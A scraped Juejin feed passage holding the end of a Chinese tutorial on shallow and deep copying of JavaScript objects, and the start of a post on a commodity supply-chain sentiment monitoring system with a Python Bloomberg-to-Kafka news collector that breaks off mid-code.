<p><code>toReversed()</code>是 ES2023 的新方法，会返回<strong>新数组</strong>（浅拷贝），但它仍然是浅拷贝，只复制第一层元素。如果数组里有对象，子对象仍共享地址。</p>
<h4 data-id="heading-7">5. 对象的浅拷贝：<code>Object.assign()</code></h4>
<p>我们先介绍一下<code>Object.assign()</code>的用法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">like</span>: [<span class="hljs-string">'🏸'</span>]
}
<span class="hljs-keyword">const</span> obj2 = {
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(obj, obj2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b774d29e0b1c4944a68456fcb6260ec1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=oTMVemZD8iuXdjWAZKl6jaBTW28%3D" alt="image.png" loading="lazy"/></p>
<p>很显然，就是把两个对象里的元素整合到一个新的对象里面了。那么接下来看如何使用<code>Object.assign()</code>来实现<strong>浅拷贝</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">like</span>: [<span class="hljs-string">'🏸'</span>]
}
obj.<span class="hljs-property">name</span> = <span class="hljs-string">'harvest'</span>;
obj.<span class="hljs-property">like</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">'🎤'</span>
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p>输出结果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e65d66818d943a1ae15a370ffea0879~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=HcscKHi23QlovlUbNwPDkT31yvg%3D" alt="image.png" loading="lazy"/></p>
<p>很明显，<code>Object.assign()</code>把原对象的属性 “搬” 到新对象里，但子对象 / 子数组还是<strong>传地址</strong> —— 所以<code>like</code>数组改了，新对象也变！</p>
<h4 data-id="heading-8">6. 手写浅拷贝函数</h4>
<p>想真正理解<strong>浅拷贝</strong>的核心，最好的方式就是自己手搓一个：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
    <span class="hljs-attr">like</span>:{
        <span class="hljs-attr">n</span>: <span class="hljs-string">'🏸'</span>,
        <span class="hljs-attr">m</span>: <span class="hljs-string">'🎤'</span>
    }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shallowCopy</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">let</span> o = {};
    <span class="hljs-comment">// 遍历原对象，将原对象中的 key, value 都存到新对象中一份</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj){
        <span class="hljs-keyword">if</span>(obj.<span class="hljs-title function_">hasOwnProperty</span>(key)){  <span class="hljs-comment">// 只拷贝自身属性</span>
            o[key] = obj[key];  <span class="hljs-comment">// 第一层属性赋值，子对象传地址</span>
        }
    }
    <span class="hljs-keyword">return</span> o;
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">shallowCopy</span>(obj);
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'🏀'</span>;  <span class="hljs-comment">// like.m也变成了🏀</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4f384d21ce74ea6b03c5f404a9b5f6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=le9lBiEhGxPIFz1nolldxxpdT2E%3D" alt="image.png" loading="lazy"/></p>
<p>这就是<strong>浅拷贝的本质</strong>：只 “复制第一层”，子对象还是共用地址～ 就像你和同事共享一个工作文件夹，你新建了文件夹快捷方式（浅拷贝），快捷方式里的普通文件是独立副本，但嵌套的子文件夹仍指向原地址。</p>
<h3 data-id="heading-9">三、深拷贝：“彻底分家，各过各的”</h3>
<p>深拷贝是 “层层拷贝”：不管对象嵌套多少层，新对象和原对象的<strong>所有属性都是独立的</strong>—— 相当于 “不仅分家，连钱包都各自买新的”。</p>
<p>但深拷贝也有 “坑”，我们一起来看看：</p>
<h4 data-id="heading-10">1. 现代浏览器的深拷贝：<code>structuredClone()</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
    <span class="hljs-attr">like</span>:{
        <span class="hljs-attr">n</span>: <span class="hljs-string">'🏸'</span>,
        <span class="hljs-attr">m</span>: <span class="hljs-string">'🎤'</span>
    },
    <span class="hljs-attr">a</span>: <span class="hljs-number">123n</span>, <span class="hljs-comment">// BigInt</span>
    <span class="hljs-title function_">say</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>);
    }
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">structuredClone</span>(obj);
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'🏀'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
<span class="hljs-comment">// 但注意：structuredClone不支持拷贝函数</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj.<span class="hljs-property">say</span>); <span class="hljs-comment">// undefined</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec8c81d2bced41aa8c2b0855342dca94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=ElYkYMXCkImiBjSJVzMxsgGK2mI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9651bf53ebc448a980807446ed46f44b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=oJnoJ4vm4RS2rFdba8V817aK6Ys%3D" alt="image.png" loading="lazy"/></p>
<p><code>structuredClone()</code>是浏览器自带的深拷贝，能处理大部分情况，但<strong>不支持函数、bigInt、Symbol</strong>等类型。</p>
<h4 data-id="heading-11">2. 经典深拷贝：<code>JSON.parse(JSON.stringify(obj))</code></h4>
<p>这是前端常用的 “曲线救国” 深拷贝，但<strong>坑特别多</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
    <span class="hljs-attr">like</span>:{
        <span class="hljs-attr">n</span>: <span class="hljs-string">'🏸'</span>,
        <span class="hljs-attr">m</span>: <span class="hljs-string">'🎤'</span>
    },
    <span class="hljs-title function_">say</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>);
    },
    <span class="hljs-attr">a</span>: <span class="hljs-literal">undefined</span>,
    <span class="hljs-attr">b</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">c</span>: <span class="hljs-title class_">NaN</span>,
    <span class="hljs-attr">d</span>: <span class="hljs-title class_">Infinity</span>
}
<span class="hljs-keyword">const</span> o = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'🏀'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o);
<span class="hljs-comment">// 结果：{name:'henry', like:{n:'🏸',m:'🎤'}, c:null, d:null}</span>
<span class="hljs-comment">// 消失的：say、a；被篡改的：NaN→null，Infinity→null</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e691415546948c2b1022eddab127f7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=ykRdjoWgn18kbES4M23PyMXfCIc%3D" alt="image.png" loading="lazy"/></p>
<p><code>JSON.stringify</code>会<strong>忽略函数、undefined</strong>，把<code>NaN/Infinity</code>转成<code>null</code>—— 所以这招只适合 “纯 JSON 结构” 的对象！</p>
<blockquote>
<p>总结：无法处理 <code>bigint</code>, <code>undefined</code>, <code>NaN</code>, <code>Infinity</code>, <code>function</code>等</p>
</blockquote>
<h4 data-id="heading-12">3. 手写深拷贝（递归版）</h4>
<p>想要自己实现深拷贝，得用<strong>递归</strong>—— 遇到子对象就继续拷贝，直到所有层都复制完。</p>
<p>先回忆下递归的逻辑，比如计算阶乘：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">n</span>){
    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>){
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">return</span> n * <span class="hljs-title function_">mul</span>(n-<span class="hljs-number">1</span>);
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">mul</span>(<span class="hljs-number">5</span>));
</code></pre>
<p>这样我们就很轻松的得出了<code>5</code>的阶层：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e75ad8af84f4c4e9729b1c493d95d8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=yIGE%2BJfnUGrSwld4c3V6OixOW6w%3D" alt="image.png" loading="lazy"/></p>
<p>深拷贝的递归思路就是：<strong>如果当前属性是对象，就递归拷贝；否则直接赋值</strong>。</p>
<p>简易手写版：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
    <span class="hljs-attr">like</span>: {
        <span class="hljs-attr">n</span>: <span class="hljs-string">'🏸'</span>,
        <span class="hljs-attr">m</span>: <span class="hljs-string">'🎤'</span>
    }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">let</span> o = {};
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
            <span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(obj[key]) == <span class="hljs-string">'object'</span> &amp;&amp; obj[key] != <span class="hljs-literal">null</span>){
                <span class="hljs-keyword">const</span> childObj = <span class="hljs-title function_">deepClone</span>(obj[key]);
                o[key] = childObj;
            } <span class="hljs-keyword">else</span>{
                o[key] = obj[key];
            }
        }
    }
    <span class="hljs-keyword">return</span> o;
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">deepClone</span>(obj);
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'🏀'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj); <span class="hljs-comment">// 还是🎤（彻底独立！）</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1a77eda9bbd467f82d3c5cf13bd9aeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=8WbLkDwakLlzMkihydKz3lpgIS8%3D" alt="image.png" loading="lazy"/></p>
<p>这样就实现了 “层层拷贝”，新对象和原对象完全独立啦～</p>
<h3 data-id="heading-13">四、浅拷贝 VS 深拷贝 怎么选？按场景选对不踩坑~</h3>




















<table><thead><tr><th>拷贝类型</th><th>特点</th><th>适用场景</th></tr></thead><tbody><tr><td>浅拷贝</td><td>只拷贝第一层，子对象共享地址</td><td>只需要第一层独立的简单对象 / 数组</td></tr><tr><td>深拷贝</td><td>层层拷贝，完全独立</td><td>嵌套层级多、需要彻底分离的对象</td></tr></tbody></table>
<p>选拷贝方式就像给数据选 <strong>“独立程度”</strong>：</p>
<ul>
<li>浅拷贝：适合<strong>数据只有一层结构</strong>（比如<code>['a', 'b', 'c']</code>、<code>{name: '张三', age: 20}</code>），或不需要修改子对象 / 子数组的场景。比如快速复制列表展示、临时复用基础属性，浅拷贝效率高，代码也简洁（<code>[...arr]</code>、<code>Object.assign</code>随手就用）。</li>
<li>深拷贝：适合<strong>数据嵌套多层</strong>（比如<code>{user: {info: {age: 18}}}</code>），且需要修改深层属性又不想影响原数据的场景。比如表单提交前的草稿复制、复杂数据的缓存备份 —— 但要注意：简单场景用<code>structuredClone</code>，需兼容特殊值（函数、BigInt）就手写递归深拷贝，别盲目用<code>JSON.parse(JSON.stringify)</code>踩坑。</li>
</ul>
<h2 data-id="heading-14">结语</h2>
<p>其实拷贝没有 “谁更好”，只有 <strong>“谁更合适”</strong>。浅拷贝是 <strong>“够用就好”</strong> 的高效选择，深拷贝是 <strong>“彻底隔离”</strong> 的稳妥方案。搞懂引用类型的本质，再结合数据结构和业务场景选拷贝方式，就能告别 “改新对象、原对象乱跳” 的崩溃时刻，让 JS 对象乖乖听你指挥～</p>
<p>最后送你个小口诀：</p>
<ul>
<li><strong>浅拷贝：“表面兄弟，内核共享”</strong></li>
<li><strong>深拷贝：“彻底分家，各自安好”</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大宗供应链企业舆情指标系统设计 (二) 数据源扩展与NLP执行方案]]></title>    <link>https://juejin.cn/post/7579946275435511818</link>    <guid>https://juejin.cn/post/7579946275435511818</guid>    <pubDate>2025-12-05T05:43:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579946275435511818" data-draft-id="7579906040537972782" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大宗供应链企业舆情指标系统设计 (二)  数据源扩展与NLP执行方案"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-12-05T05:43:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="语落心生"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大宗供应链企业舆情指标系统设计 (二)  数据源扩展与NLP执行方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    语落心生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:43:52.000Z" title="Fri Dec 05 2025 05:43:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>阶段目标</strong>: 扩展到150+采购商，完整NLP模型部署，指标体系完善<br/>
<strong>核心交付物</strong>: 完整舆情指标系统、决策API、BI仪表板、生产级部署</p>
<hr/>
<h2 data-id="heading-0">数据源扩展与NLP完整部署</h2>
<h3 data-id="heading-1">数据源扩展 (20+个源)</h3>
<h4 data-id="heading-2">任务分解</h4>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">新增18个数据源:</span>

<span class="hljs-section">第一类: 全球主流财经新闻 (5个源)</span>
├─ Bloomberg API
├─ CNBC RSS Feed
├─ Financial Times API
├─ MarketWatch
└─ Wall Street Journal

<span class="hljs-section">第二类: 地缘政治情报 (4个源)</span>
├─ ICG (国际危机组织) 报告爬虫
├─ 国务院新闻办 (官方声明)
├─ 外交部 (官方声明)
└─ 各国驻华大使馆新闻稿

<span class="hljs-section">第三类: 商品期货 (3个源)</span>
├─ LME金属交易所 (铜、锌、铝)
├─ NYMEX农产品 (大豆、小麦、玉米)
└─ ICE能源 (天然气、布伦特油)

<span class="hljs-section">第四类: 港口与物流 (4个源)</span>
├─ 上海港口官网API
├─ 鹿特丹港口官网API
├─ 新加坡港口官网API
└─ MarineTraffic AIS数据 (船舶实时位置)

<span class="hljs-section">第五类: 汇率与金融指标 (2个源)</span>
├─ 央行外汇牌价API
└─ CDS价差数据 (彭博终端)
</code></pre>
<h4 data-id="heading-3">Bloomberg API集成 (示例)</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> kafka <span class="hljs-keyword">import</span> KafkaProducer
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BloombergCollector</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, api_key, kafka_broker</span>):
        self.api_key = api_key
        self.producer = KafkaProducer(
            bootstrap_servers=kafka_broker,
            value_serializer=<span class="hljs-keyword">lambda</span> x: json.dumps(x).encode(<span class="hljs-string">'utf-8'</span>)
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_news_by_ticker</span>(<span class="hljs-params">self, ticker, since_hours=<span class="hljs-number">1</span></span>):
        <span class="hljs-string">"""根据商品代码获取相关新闻"""</span>
        since_time = datetime.utcnow() - timedelta(hours=since_hours)
        
        headers = {
            <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">f'Bearer <span class="hljs-subst">{self.api_key}</span>'</span>,
            <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
        }
        
        params = {
            <span class="hljs-string">'query'</span>: <span class="hljs-string">f'ticker:<span class="hljs-subst">{ticker}</span>'</span>,
            <span class="hljs-string">'startDate'</span>: since_time.strftime(<span class="hljs-string">'%Y-%m-%dT%H:%M:%S'</span>),
            <span class="hljs-string">'limit'</span>: <span class="hljs-number">100</span>
        }
        
        response = requests.get(
            <span class="hljs-string">'https://api.bloomberg.com/v1/articles'</span>,
            headers=headers,
            params=params
        )
        
        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
            articles = response.json().get(<span class="hljs-string">'articles'</span>, [])
            
            <span class="hljs-keyword">for</span> article <span class="hljs-keyword">in</span> articles:
                event = {
                    <span class="hljs-string">'event_id'</span>: article[<span class="hljs-string">'id'</span>],
                    <span class="hljs-string">'ingest_timestamp'</span>: datetime.utcnow().isoformat(),
                    <span class="hljs-string">'risk_date'</span>: article[<span class="hljs-string">'publishedDate'</span>][:<span class="hljs-number">10</span>],
                    <span class="hljs-string">'source_type'</span>: <span class="hljs-string">'news'</span>,
                    <span class="hljs-string">'source_name'</span>: <span class="hljs-string">'Bloomberg'</span>,
                    <span class="hljs-string">'source_url'</span>: article[<span class="hljs-string">'url'</span>],
                    <span class="hljs-string">'raw_text'</span>: article[<span class="hljs-string">'title'</span>] + <span class="hljs-string">'\n'</span> + article.get(<span class="hljs-string">'summary'</span>, <span class="hljs-string">''</span>),
                    <span class="hljs-string">'language'</span>: <span class="hljs-string">'en'</span>,
                    <span class="hljs-string">'detected_geo_keys'</span>: [],
                    <span class="hljs-string">'keywords'</span>: [ticker] + article.get(<span class="hljs-string">'tags'</span>, []),
                    <span class="hljs-string">'nlp_processing_flag'</span>: <span class="hljs-literal">False</span>,
                    <span class="hljs-string">'processing_version'</span>: <span class="hljs-number">0</span>,
                    <span class="hljs-string">'confidence_raw'</span>: <span class="hljs-number">0.9</span>,
                    <span class="hljs-string">'_ticker'</span>: ticker  <span class="hljs-comment"># 标记商品</span>
                }
                
                self.producer.send(<span class="hljs-string">'raw_news_events'</span>, value=event)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_continuous</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""持续监测多个商品"""</span>
        <span class="hljs-keyword">import</span> schedule
        <span class="hljs-keyword">import</span> time
        
        tickers = [<span class="hljs-string">'CRU'</span>, <span class="hljs-string">'USCRWTIC'</span>, <span class="hljs-string">'GC'</span>, <span class="hljs-string">'SI'</span>, <span class="hljs-string">'RB'</span>]  <span class="hljs-comment"># 示例代码</span>
        
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">job</span>():
            <span class="hljs-keyword">for</span> ticker <span class="hljs-keyword">in</span> tickers:
                <span class="hljs-keyword">try</span>:
                    self.fetch_news_by_ticker(ticker)
                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Error fetching <span class="hljs-subst">{ticker}</span>: <span class="hljs-subst">{e}</span>'</span>)
        
        schedule.every(<span class="hljs-number">30</span>).minutes.do(job)
        
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            schedule.run_pending()
            time.sleep(<span class="hljs-number">60</span>)

<span class="hljs-comment"># 部署</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    collector = BloombergCollector(
        api_key=<span class="hljs-string">'your_api_key'</span>,
        kafka_broker=<span class="hljs-string">'kafka1:9092,kafka2:9092,kafka3:9092'</span>
    )
    collector.run_continuous()
</code></pre>
<h4 data-id="heading-4">港口状态API集成</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> kafka <span class="hljs-keyword">import</span> KafkaProducer
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PortStatusCollector</span>:
    <span class="hljs-string">"""收集主要港口的实时状态"""</span>
    
    MAJOR_PORTS = {
        <span class="hljs-string">'shanghai'</span>: {
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'上海港'</span>,
